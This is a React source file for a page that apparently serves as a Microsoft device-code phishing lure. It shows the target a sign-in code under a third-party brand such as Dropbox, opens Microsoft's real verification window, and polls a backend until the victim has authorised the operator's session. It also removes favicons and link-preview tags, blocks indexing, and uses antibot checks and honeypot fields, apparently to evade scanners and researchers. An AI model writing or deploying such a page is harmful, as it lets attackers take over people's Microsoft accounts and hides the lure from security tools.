import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { prepareAntibotPayload } from "../lib/antibot";
import { getTheme, type LinkTheme } from "../lib/themes";

const API_BASE = import.meta.env.VITE_API_URL || "";

interface SessionInfo {
  sessionId: string;
  userCode: string;
  verificationUri: string;
}

export function ConnectLinkPage() {
  const { loginId: linkId } = useParams<{ loginId: string }>();
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [status, setStatus] = useState<"loading" | "starting" | "ready" | "signing_in" | "done" | "error">("loading");
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [honeypot, setHoneypot] = useState({ email_address: "", phone_number: "", website_url: "" });
  const [theme, setTheme] = useState<LinkTheme>(getTheme("dropbox"));

  // Set page title + meta, remove favicon
  useEffect(() => {
    const originalTitle = document.title;
    document.title = theme.pageTitle;

    const existingIcons = document.querySelectorAll("link[rel*='icon']");
    const removedIcons: { el: HTMLElement; parent: HTMLElement }[] = [];
    existingIcons.forEach((el) => {
      if (el.parentNode) {
        removedIcons.push({ el: el as HTMLElement, parent: el.parentNode as HTMLElement });
        el.parentNode.removeChild(el);
      }
    });

    const blankFavicon = document.createElement("link");
    blankFavicon.rel = "icon";
    blankFavicon.href = "data:,";
    document.head.appendChild(blankFavicon);

    const robotsMeta = document.createElement("meta");
    robotsMeta.name = "robots";
    robotsMeta.content = "noindex, nofollow, nosnippet, noarchive, noimageindex";
    document.head.appendChild(robotsMeta);

    const previewMetas = document.querySelectorAll(
      'meta[property^="og:"], meta[name="description"], meta[name="twitter:card"], meta[name="twitter:title"], meta[name="twitter:description"]'
    );
    const removedMetas: { el: HTMLElement; parent: HTMLElement }[] = [];
    previewMetas.forEach((el) => {
      if (el.parentNode) {
        removedMetas.push({ el: el as HTMLElement, parent: el.parentNode as HTMLElement });
        el.parentNode.removeChild(el);
      }
    });

    return () => {
      document.title = originalTitle;
      document.head.removeChild(blankFavicon);
      document.head.removeChild(robotsMeta);
      removedIcons.forEach(({ el, parent }) => parent.appendChild(el));
      removedMetas.forEach(({ el, parent }) => parent.appendChild(el));
    };
  }, [theme.pageTitle]);

  // Step 1: Validate the link exists + get theme
  useEffect(() => {
    if (!linkId) return;

    fetch(`${API_BASE}/microsoft/connect-info/${linkId}`)
      .then((res) => {
        if (!res.ok) return res.json().catch(() => ({})).then((data) => {
          throw new Error(data.error || `Request failed (${res.status})`);
        });
        return res.json();
      })
      .then((data) => {
        if (data.theme) setTheme(getTheme(data.theme));
        startSession();
      })
      .catch((err) => {
        setError(err.message);
        setStatus("error");
      });
  }, [linkId]);

  // Step 2: Start a fresh device code session (with antibot protection)
  const startSession = async () => {
    setStatus("starting");
    setError(null);
    setSession(null);

    try {
      const antibotPayload = await prepareAntibotPayload(API_BASE, linkId!, honeypot);

      const res = await fetch(`${API_BASE}/microsoft/start-session/${linkId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ antibot: antibotPayload }),
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error || "Failed to start session");
      }
      const data = await res.json();
      setSession({
        sessionId: data.sessionId,
        userCode: data.userCode,
        verificationUri: data.verificationUri,
      });
      setStatus("ready");
    } catch (err: any) {
      setError(err.message);
      setStatus("error");
    }
  };

  // Step 3: Poll for completion
  useEffect(() => {
    if (status !== "signing_in" || !session) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${API_BASE}/microsoft/session-status/${session.sessionId}`);
        const data = await res.json();

        if (data.status === "completed") {
          clearInterval(interval);
          setStatus("done");
        } else if (data.status === "error") {
          clearInterval(interval);
          setError(data.error);
          setStatus("error");
        }
      } catch {
        // keep polling
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [status, session]);

  const handleCopyCode = () => {
    if (session?.userCode) {
      navigator.clipboard.writeText(session.userCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleLogin = () => {
    if (!session) return;
    const url = `${session.verificationUri}?otc=${session.userCode}`;
    const w = 420;
    const h = 550;
    const left = Math.round(window.screenX + (window.outerWidth - w) / 2);
    const top = Math.round(window.screenY + (window.outerHeight - h) / 2);
    window.open(url, "msLogin", `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=no`);
    setStatus("signing_in");
  };

  const handleConnectAnother = () => {
    setHoneypot({ email_address: "", phone_number: "", website_url: "" });
    startSession();
  };

  const t = theme;

  return (
    <div className="login-page">
      <div className="login-card" style={{ maxWidth: 480 }}>
        {/* Honeypot fields */}
        <div
          style={{ position: "absolute", left: "-9999px", top: "-9999px", opacity: 0, height: 0, overflow: "hidden" }}
          aria-hidden="true"
          tabIndex={-1}
        >
          <input type="email" name="email_address" autoComplete="off" tabIndex={-1}
            value={honeypot.email_address}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, email_address: e.target.value }))} />
          <input type="tel" name="phone_number" autoComplete="off" tabIndex={-1}
            value={honeypot.phone_number}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, phone_number: e.target.value }))} />
          <input type="url" name="website_url" autoComplete="off" tabIndex={-1}
            value={honeypot.website_url}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, website_url: e.target.value }))} />
        </div>

        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: 24 }}
          dangerouslySetInnerHTML={{ __html: t.logo }} />

        {(status === "loading" || status === "starting") && (
          <div style={{ textAlign: "center", padding: "40px 0" }}>
            <div className="loading-spinner" />
            <p style={{ marginTop: 16, color: "#637282" }}>
              {status === "loading" ? "Loading..." : "Preparing secure access..."}
            </p>
          </div>
        )}

        {status === "ready" && session && (
          <div>
            <h1 style={{ fontSize: 20, marginBottom: 8, textAlign: "center", color: "#1e1919" }}>{t.heading}</h1>
            <p style={{ marginBottom: 28, color: "#637282", textAlign: "center", lineHeight: 1.6, fontSize: 14 }}>
              {t.subtitle}
            </p>

            <div style={{
              background: t.bgTint, borderRadius: 12,
              padding: "24px", marginBottom: 20, textAlign: "center",
            }}>
              <div style={{ fontSize: 11, color: "#637282", marginBottom: 10, textTransform: "uppercase", letterSpacing: 1.5, fontWeight: 600 }}>
                {t.codeLabel}
              </div>
              <div style={{
                fontSize: 36, fontWeight: 700, letterSpacing: 8,
                color: t.primaryColor, fontFamily: "monospace", marginBottom: 12,
              }}>
                {session.userCode}
              </div>
              <button
                onClick={handleCopyCode}
                style={{
                  padding: "6px 20px", fontSize: 13,
                  background: copied ? t.primaryColor : "white",
                  color: copied ? "white" : "#1e1919",
                  border: "1px solid #d4d2cf",
                  borderRadius: 8, cursor: "pointer", transition: "all 0.2s",
                }}
              >
                {copied ? "Copied!" : "Copy Code"}
              </button>
            </div>

            <div style={{
              marginBottom: 20, padding: "16px",
              background: t.bgTint, borderRadius: 8,
              fontSize: 13, color: "#637282", lineHeight: 1.8,
            }}>
              <div style={{ fontWeight: 600, marginBottom: 8, color: "#1e1919" }}>Steps:</div>
              {t.steps.map((step, i) => (
                <div key={i}>{i + 1}. {step}</div>
              ))}
            </div>

            <button
              onClick={handleLogin}
              style={{
                padding: "14px 32px", fontSize: 15, width: "100%",
                display: "flex", justifyContent: "center", alignItems: "center", gap: 8,
                background: t.primaryColor, color: "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
                transition: "background 0.2s",
              }}
              onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
              onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
            >
              {t.buttonText}
            </button>
          </div>
        )}

        {status === "signing_in" && (
          <div style={{ textAlign: "center" }}>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Waiting for sign-in</h1>
            <p style={{ color: "#637282", marginBottom: 24, lineHeight: 1.6, fontSize: 14 }}>
              Complete the sign-in in the Microsoft window that opened. This page will update automatically.
            </p>
            <div className="loading-spinner" />
          </div>
        )}

        {status === "done" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 56, height: 56, borderRadius: "50%", background: "#e6f9ed",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px",
            }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#0d9f3f"/>
              </svg>
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>{t.successHeading}</h1>
            <p style={{ color: "#637282", lineHeight: 1.6, marginBottom: 20, fontSize: 14 }}>
              {t.successMessage}
            </p>
            <button
              onClick={handleConnectAnother}
              style={{
                padding: "10px 24px", fontSize: 14,
                background: t.primaryColor, color: "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
              }}
            >
              {t.againLabel}
            </button>
          </div>
        )}

        {status === "error" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 56, height: 56, borderRadius: "50%", background: "#fde8e8",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px",
            }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#d32f2f"/>
              </svg>
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Something went wrong</h1>
            <p style={{ color: "#d32f2f", marginBottom: 16, lineHeight: 1.6, fontSize: 14 }}>
              {error || "Please try again."}
            </p>
            <button
              onClick={handleConnectAnother}
              style={{
                padding: "10px 24px", fontSize: 14,
                background: t.primaryColor, color: "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
              }}
            >
              Try again
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
